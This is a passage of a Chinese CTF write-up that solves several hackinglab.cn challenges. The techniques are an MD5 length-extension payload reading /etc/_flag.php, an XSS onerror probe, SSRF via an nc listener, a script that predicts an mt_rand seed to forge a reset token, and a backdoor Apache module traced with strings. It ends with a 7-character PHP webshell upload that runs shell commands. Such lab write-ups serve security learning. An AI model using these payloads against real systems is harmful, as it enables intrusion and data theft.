class="line">$res=checksign($filepath,$mysalt,$sign);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">    echo getfile($filepath);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    echo &apos;sign error!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function testsign($filepath,$mysalt)&#123;</span><br><span class="line">echo myhash($filepath,$mysalt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;!--&quot;.file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure><p>题目已经给出提示<code>MD5 Length Extension Attack!</code>，md5长度扩展攻击，<br>先看看代码，可以知道的是已知<code>md5</code>，已知<code>salt的长度</code>，还知道<code>/etc/hosts</code>,<br>这里给出<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">工具下载链接</a><br>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -h</span><br><span class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --help          Display this message.</span><br><span class="line">    -t --test          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length in bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure></p><p>安装方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p><p>这里我们知道的是<code>signature</code>、<code>data</code>、<code>keylength</code>,需要读取的文件这里写成<code>_flag.php</code><br>所以工具使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/_flag.php</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/41625045.jpg" alt="" title="" class="">                <p></p>            </figure><p>提交时需要把<code>\x</code>换成<code>%</code>，因为是URL编码的<br>最终的payload是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/decrypt1_53a52adb49c55c8daa5c8ee0ff59befe/md5_le.php?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00/etc/_flag.php&amp;sign=7fbbac6efeb7939be04829bc9a847f0c</span><br></pre></td></tr></table></figure></p><h4 id="美丽的邂逅与密码器的开门密码"><a href="#美丽的邂逅与密码器的开门密码" class="headerlink" title="美丽的邂逅与密码器的开门密码"></a>美丽的邂逅与密码器的开门密码</h4><p>这题题目给的一个exe文件，名字还是<code>reverse</code>,逆向题，IDA打开之后找到主函数</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/25904383.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以看到当<code>v19</code>等于<code>1</code>的时候才会输出一段字符，找到<code>401005</code>函数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401005(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return sub_401020(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>又跳到了<code>401020</code>,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL __cdecl sub_401020(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2; // [sp+Ch] [bp-44h]@1</span><br><span class="line">  int v3; // [sp+4Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;v2, 0xCCu, 0x44u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v3 = strlen(a1);</span><br><span class="line">  return v3 &gt; 50;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出来当<code>v20</code>的长度大于<code>50</code>就能返回<code>true</code>，也就是<code>1</code><br>运行程序，输入任意字符，长度大于50:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/66247550.jpg" alt="" title="" class="">                <p></p>            </figure><p>得到key</p><h3 id="综合关"><a href="#综合关" class="headerlink" title="综合关"></a>综合关</h3><h4 id="渗透测试第一期"><a href="#渗透测试第一期" class="headerlink" title="渗透测试第一期"></a>渗透测试第一期</h4><p>这题先把每个页面<code>POST</code>的变量抓个包看看，<br>在尝试了几次之后，发现几个问题</p><ul><li>注册时用户名不能使用<code>admin</code></li><li>在绑定手机页面出现了<code>username</code>这个变量</li><li>绑不绑定手机效果都一样</li><li>在忘记密码页面，需要跟用户名与之绑定的手机号才能得到验证码</li></ul><p>这题就有了大概的思路，需要登录进<code>admin</code>账户，但是不知道密码，<br>爆破试了之后发现不少弱口令，所以需要<code>重置密码</code>，<code>重置密码</code>时需要<code>手机号</code>，<br>但是当将<code>username</code>等于<code>admin</code>之后，发现:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/35560040.jpg" alt="" title="" class="">                <p></p>            </figure><p>所以需要将<code>admin</code>用户的手机号绑定为已知的手机号，刚好在绑定手机页面<code>username</code>可以更改，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/18276112.jpg" alt="" title="" class="">                <p></p>            </figure><p>回到<code>忘记密码</code>页面，Username填写<code>admin</code>，正常发送即可重置密码</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/74060841.jpg" alt="" title="" class="">                <p></p>            </figure><p>再用重置的密码登陆即可得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/4310267.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="没有注入到底能不能绕过登录"><a href="#没有注入到底能不能绕过登录" class="headerlink" title="没有注入到底能不能绕过登录"></a>没有注入到底能不能绕过登录</h4><p>首先题目提示了不是SQL注入，并且题目里没有什么有用的提示，<br>所以只能先扫一下后台，发现<code>robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /myadminroot/</span><br></pre></td></tr></table></figure><p>访问一下<code>myadminroot</code>，但是提示<code>Please login first!</code><br>所以现在找办法登陆，但是我用burpsuite抓包时发现，<br>在登陆页面<code>go</code>一次之后，在其他页面访问<code>myadminroot</code>就能得到<code>key</code><br>所以发现了在弹出<code>error</code>时，不点击确认就不会将已经登陆的状态取消，<br>估计就是<code>session</code>的原因，直接得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/32440387.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="美图闪亮亮交友平台"><a href="#美图闪亮亮交友平台" class="headerlink" title="美图闪亮亮交友平台"></a>美图闪亮亮交友平台</h4><p>题目直接给了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tips: 邮箱没有xss漏洞</span><br><span class="line">Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823)</span><br></pre></td></tr></table></figure></p><p>邮箱没有XSS，但是在题目中的<code>input</code>框中还是存在XSS，管理员也没有cookie，<br>所以没办法使用<code>管理员的cookie</code>登陆进后台，<br>在网上找了也没有writeup，最终看到了<a href="http://www.dianyue.me/archives/743/jgm7qbcmkh94wam6/" target="_blank" rel="noopener">出题人给的提示</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目采用curl模拟方式来模拟管理员审核的过程。</span><br></pre></td></tr></table></figure></p><p>估计是<code>SSRF</code><br>先说下解题思路，在<code>姓名</code>和<code>照片描述</code>处都没有做要求，但是在<code>图片URL</code>处对内容做了要求，<br>必须是网址，但是抓包发送的话可以<code>绕过js</code>，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/85558377.jpg" alt="" title="" class="">                <p></p>            </figure><p>并且在<code>&lt;img&gt;</code>处没有过滤，可以正常弹窗，代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.hackinglab.cn/meitu.jpg11&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure></p><p>一开始看起来像<code>存储型XSS</code>但是题目给了提示，并不是XSS<br>所以只能换一种思路，在看了出题人给的提示之后，看到了<code>curl</code></p><p>SSRF 漏洞出现的场景：</p><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li></ul><p>猜测是管理员用<code>curl</code>命令访问了<code>图片URL</code>,<br>这里采用<code>nc</code>来获取信息:<br>服务器端，监听一个端口（确保这个端口是开着的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8888</span><br></pre></td></tr></table></figure></p><p>图片URL:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的服务器IP:8888</span><br></pre></td></tr></table></figure></p><p>再发送即可，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/57813388.jpg" alt="" title="" class="">                <p></p>            </figure><p>此时在自己的服务器上可以看到一个请求</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/97865878.jpg" alt="" title="" class="">                <p></p>            </figure><p>访问这个URL即可得到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/31563770.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="最简单的数字取证1"><a href="#最简单的数字取证1" class="headerlink" title="最简单的数字取证1"></a>最简单的数字取证1</h4><p>这题可以直接用软件<code>DiskGenius</code>，网上一搜一大把，是一个用来分区的软件，<br>打开软件，在上方的<code>磁盘</code>-&gt;<code>打开虚拟磁盘文件</code>-&gt;选择下载下来的文件即可,之后打开磁盘可以直接看到key</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/35196034.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="最简单的数字取证2"><a href="#最简单的数字取证2" class="headerlink" title="最简单的数字取证2"></a>最简单的数字取证2</h4><p>方法与上题一样，不过key文件在<code>RECYLER</code>里的一个文件中的<code>De1.txt</code>里</p><h4 id="小明学习代码审计"><a href="#小明学习代码审计" class="headerlink" title="小明学习代码审计"></a>小明学习代码审计</h4><p>一个代码审计题，打开题目查看源代码可以发现一个<code>resetpwd.php</code>的页面，打开之后是一个提交的input框，<br>右键查看源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">session_start();</span><br><span class="line">include &apos;_flag.php&apos;;</span><br><span class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</span><br><span class="line">if(isset($_POST[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;token&apos;]) &amp;&amp;!empty($_POST[&apos;token&apos;])&amp;&amp;!empty($_SESSION[&apos;token&apos;]))&#123;</span><br><span class="line">    if($_POST[&apos;token&apos;]==$_SESSION[&apos;token&apos;])&#123;</span><br><span class="line">        echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    echo &quot;Token_error!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    mt_srand(time());</span><br><span class="line">    $rand= mt_rand();</span><br><span class="line">    $_SESSION[&apos;token&apos;]=sha1(md5($rand));</span><br><span class="line">    echo &quot;Token Generate Ok! now send email to your EmailBox!.....&quot;;</span><br><span class="line">    if(sendmymail($_SESSION[&apos;token&apos;]))&#123;</span><br><span class="line">    echo &quot;SendOK! \r\n&lt;br&gt; Your password reset Token has been send to your mailbox! &lt;br&gt;Please Check your mail box and fill your token here to reset your password!&lt;br&gt;&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>先说说代码什么意思，首先我们能控制的变量是<code>token</code>，并且需要与<code>$_SESSION[&#39;token&#39;]</code>相等,<br>而<code>$_SESSION[&#39;token&#39;]</code>，是被加密过的，而且这个加密看起来不能绕过，因为有随机数<code>$rand</code>，<br>所以这个时候需要了解一下<code>伪随机数</code>这个概念了，<br>先来看看php的<code>mt_srand()</code>和<code>mt_rand()</code>，<br>mt_srand():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。</span><br><span class="line">Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</span><br></pre></td></tr></table></figure></p><p>mt_rand():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成更好的随机数</span><br></pre></td></tr></table></figure></p><p>简单来说就是首先用<code>mt_srand()</code>播种，然后<code>mt_rand()</code>以这个<code>seed</code>随机生成数据，<br>但是我们可以发现，当seed一样时，<code>mt_rand</code>生成的数据顺序是一样的，测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $seed=10;</span><br><span class="line">     mt_srand($seed);</span><br><span class="line">    for ($i=0; $i &lt; 10; $i++) &#123; </span><br><span class="line">    $rand= mt_rand();</span><br><span class="line">    echo $rand.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure></p><p>当指定的<code>seed</code>为固定时，产生的随机数顺序一样，所以不管上面的测试代码怎么刷新，得到的值总是一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">502355954</span><br><span class="line">641584702</span><br><span class="line">2112621188</span><br><span class="line">1074089073</span><br><span class="line">1360749216</span><br><span class="line">1207911374</span><br><span class="line">546519883</span><br><span class="line">1786516046</span><br><span class="line">1082451610</span><br><span class="line">903986200</span><br></pre></td></tr></table></figure></p><p>回到这一题，这题的<code>seed</code>是<code>time()</code>，当前时间戳，一样的道理，<br>我们首先在本地获取到当前的时间戳，并且以这个时间戳为seed，<br>然后产生随机数即可与服务器上的<code>$_SESSION[&#39;token&#39;]</code>相同,这里采用php+python,<br>php用来获取随机数，python用来发送<br>php代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  //rand.php</span><br><span class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</span><br><span class="line">mt_srand(time());</span><br><span class="line">$rand= mt_rand();</span><br><span class="line">$hax = sha1(md5($rand));</span><br><span class="line">echo $hax;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>python代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">local = requests.session()</span><br><span class="line">a = requests.session()</span><br><span class="line">url = &quot;http://127.0.0.1/rand.php&quot;</span><br><span class="line">r = local.get(url)</span><br><span class="line">hax = r.text</span><br><span class="line">url2 = &quot;http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php&quot;</span><br><span class="line">x = a.get(url2)</span><br><span class="line">x = a.post(url2,data=&#123;&apos;token&apos;: hax&#125;)</span><br><span class="line">print (x.text)</span><br></pre></td></tr></table></figure><p>由于延迟，可能会有几次失败，多试几次即可<br>运行py脚本得到key:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/36845939.jpg" alt="" title="" class="">                <p></p>            </figure><h4 id="HackingLab首台rootkit题目虚拟机-公测"><a href="#HackingLab首台rootkit题目虚拟机-公测" class="headerlink" title="HackingLab首台rootkit题目虚拟机[公测]"></a>HackingLab首台rootkit题目虚拟机[公测]</h4><p>先放上题目的提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">要求: 找到系统rootkit后门(不是木马)并提取后门密码</span><br><span class="line">密码验证方式:验证可以远程获取root权限,则说明密码正确.</span><br><span class="line">正确的密码即为过关密码 </span><br><span class="line">虚拟机信息:[root密码hackinglab.cn] </span><br><span class="line">下载地址: http://pan.baidu.com/s/1bnoKlOj 密码: bpe5</span><br><span class="line">若无法下载请联系@CplusHua</span><br><span class="line">该题目可能难度较大，涉及到应急响应分析，病毒木马查杀，简单逆向分析等</span><br></pre></td></tr></table></figure></p><p>先正常的将虚拟机下载下来并导入，配置好网络之后正常连接</p><p>首先网站的目录里什么都没有，看一下以root权限的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -u root</span><br></pre></td></tr></table></figure><p>可以看到进程里有一个<code>httpd进程</code>，但是httpd是不需要root权限的，<br>先查看一下<code>apache</code>加载了哪些模块:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rootkit modules]# apachectl -l</span><br><span class="line">Compiled in modules:</span><br><span class="line">  core.c</span><br><span class="line">  prefork.c</span><br><span class="line">  http_core.c</span><br><span class="line">  mod_so.c</span><br></pre></td></tr></table></figure></p><p>都是正常的，所以现在去找一下apache的目录下查看modules目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@rootkit modules]# cd /etc/httpd/modules/</span><br><span class="line">[root@rootkit modules]# ls</span><br><span class="line">libphp5.so            mod_authn_file.so       mod_cgid.so        mod_ext_filter.so    mod_mime.so            mod_rootme22.so</span><br><span class="line">mod_actions.so        mod_authnz_ldap.so      mod_cgi.so         mod_filter.so        mod_negotiation.so     mod_setenvif.so</span><br><span class="line">mod_alias.so          mod_authz_dbm.so        mod_dav_fs.so      mod_headers.so       mod_proxy_ajp.so       mod_speling.so</span><br><span class="line">mod_asis.so           mod_authz_default.so    mod_dav.so         mod_ident.so         mod_proxy_balancer.so  mod_status.so</span><br><span class="line">mod_auth_basic.so     mod_authz_groupfile.so  mod_dbd.so         mod_include.so       mod_proxy_connect.so   mod_substitute.so</span><br><span class="line">mod_auth_digest.so    mod_authz_host.so       mod_deflate.so     mod_info.so          mod_proxy_ftp.so       mod_suexec.so</span><br><span class="line">mod_authn_alias.so    mod_authz_owner.so      mod_dir.so         mod_ldap.so          mod_proxy_http.so      mod_unique_id.so</span><br><span class="line">mod_authn_anon.so     mod_authz_user.so       mod_disk_cache.so  mod_log_config.so    mod_proxy_scgi.so      mod_userdir.so</span><br><span class="line">mod_authn_dbd.so      mod_autoindex.so        mod_dumpio.so      mod_log_forensic.so  mod_proxy.so           mod_usertrack.so</span><br><span class="line">mod_authn_dbm.so      mod_cache.so            mod_env.so         mod_logio.so         mod_reqtimeout.so      mod_version.so</span><br><span class="line">mod_authn_default.so  mod_cern_meta.so        mod_expires.so     mod_mime_magic.so    mod_rewrite.so         mod_vhost_alias.so</span><br></pre></td></tr></table></figure><p>发现一个一个<code>mod_rootme22.so</code>很奇怪</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[root@rootkit modules]# strings mod_rootme22.so </span><br><span class="line">__gmon_start__</span><br><span class="line">_init</span><br><span class="line">_fini</span><br><span class="line">__cxa_finalize</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">pidlist</span><br><span class="line">pipe_A</span><br><span class="line">pipe_B</span><br><span class="line">shell_spooler</span><br><span class="line">ttyname</span><br><span class="line">pipe</span><br><span class="line">fork</span><br><span class="line">getppid</span><br><span class="line">exit</span><br><span class="line">waitpid</span><br><span class="line">write</span><br><span class="line">select</span><br><span class="line">read</span><br><span class="line">kill</span><br><span class="line">close</span><br><span class="line">runshell_raw</span><br><span class="line">runshell_pty</span><br><span class="line">process_client</span><br><span class="line">strncmp</span><br><span class="line">shutdown</span><br><span class="line">send</span><br><span class="line">recv</span><br><span class="line">setsid</span><br><span class="line">dup2</span><br><span class="line">execlp</span><br><span class="line">openpty</span><br><span class="line">memset</span><br><span class="line">ioctl</span><br><span class="line">malloc</span><br><span class="line">strncpy</span><br><span class="line">putenv</span><br><span class="line">chdir</span><br><span class="line">core_module</span><br><span class="line">ap_get_module_config</span><br><span class="line">strcmp</span><br><span class="line">ap_hook_post_config</span><br><span class="line">ap_hook_post_read_request</span><br><span class="line">rootme22_module</span><br><span class="line">libutil.so.1</span><br><span class="line">libc.so.6</span><br><span class="line">_edata</span><br><span class="line">__bss_start</span><br><span class="line">_end</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">ATSubH</span><br><span class="line">/usr/sbin/apache2 -k start</span><br><span class="line">hackinglabwelcomeyou!</span><br><span class="line">wearefriends+</span><br><span class="line">mod_rootme22.c</span><br><span class="line">22PA</span><br></pre></td></tr></table></figure><p>得到flag</p><h4 id="代码审计与综合利用"><a href="#代码审计与综合利用" class="headerlink" title="代码审计与综合利用"></a>代码审计与综合利用</h4><p>跟前一题一样，把环境搭好之后访问:</p><p>一开始题目没给什么提示，查看源代码可以看到需要提交<code>src</code>这个参数，可以看到源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$savepath=&quot;files/&quot;.sha1(session_id()).&quot;/&quot;;</span><br><span class="line">if(!is_dir($savepath))&#123;</span><br><span class="line">    $oldmask=umask(0);</span><br><span class="line">    mkdir($savepath,0777);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">    touch($savepath.&quot;/index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(($_POST[&apos;filename&apos;])&amp;&amp;($_POST[&apos;content&apos;]))&#123;</span><br><span class="line">    $fp=fopen(&quot;$savepath&quot;.$_POST[&apos;filename&apos;],&apos;w&apos;);</span><br><span class="line">    fwrite($fp,substr($_POST[&apos;content&apos;],0,7));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    $msg=&apos;File saved to &lt;a&gt;&apos;.$savepath.htmlspecialchars($_POST[&apos;filename&apos;]).&quot;&lt;/a&gt;&quot;;</span><br><span class="line">    echo $msg;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php if(@$_GET[&apos;src&apos;]) show_source(__FILE__);?&gt;</span><br><span class="line">&lt;!-- &lt;a href=&quot;./?src=&quot;&gt;src&lt;/a&gt;--&gt;</span><br></pre></td></tr></table></figure></p><p>一道代码审计题，第一个if是用来创建文件的，先不用管，主要是第二个if<br>这题估计是一个上传shell的题，首先上传的内容只能是7个字符，多了写不进去，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`*`;</span><br></pre></td></tr></table></figure><p>php这样写完之后，会把当前目录下的所有文件都执行一遍，<br>利用这个特性，可以写入一遍历目录的命令，随后POST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh.php&amp;content=&lt;?=`*`;</span><br></pre></td></tr></table></figure></p><p>此时这个木马已经上传上去了,回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File saved to files/6a9c5c89231381902ed84c8bebec2b0a7db1defe/hh.php</span><br></pre></td></tr></table></figure></p><p>再上传:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh&amp;content=ls /</span><br></pre></td></tr></table></figure></p><p>和<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=bash&amp;content=ls /</span><br></pre></td></tr></table></figure></p><p>此时可以看到</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86147898.jpg" alt="" title="" class="">                <p></p>            </figure><p>再将hh的内容改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh&amp;content=cat /t*</span><br></pre></td></tr></table></figure></p><p>执行得到flag:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86052071.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
